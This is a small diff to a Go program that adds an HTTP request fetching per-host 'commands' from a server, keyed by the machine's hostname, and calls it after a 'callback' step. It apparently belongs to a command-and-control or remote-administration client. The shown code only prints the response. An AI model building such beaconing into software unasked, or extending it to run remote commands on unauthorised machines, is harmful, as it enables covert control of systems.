@@ -48,10 +48,21 @@ func callback() {
 func get_commands() {
 	hn := get_hn()
 	url = "http://" + serv + "/api/commands/" + hn
+	r, err := http.Get(url)
+	if err != nil{
+		panic(err)
+	}
+	defer r.Body.Close()
+	txt, err := ioutil.ReadAll(r.Body)
+	if err != nil{
+		panic(err)
+	}
+	fmt.Printf("%s\n", txt)
 }
 
 func run(){
 	callback()
+	get_commands()
 }
 
 
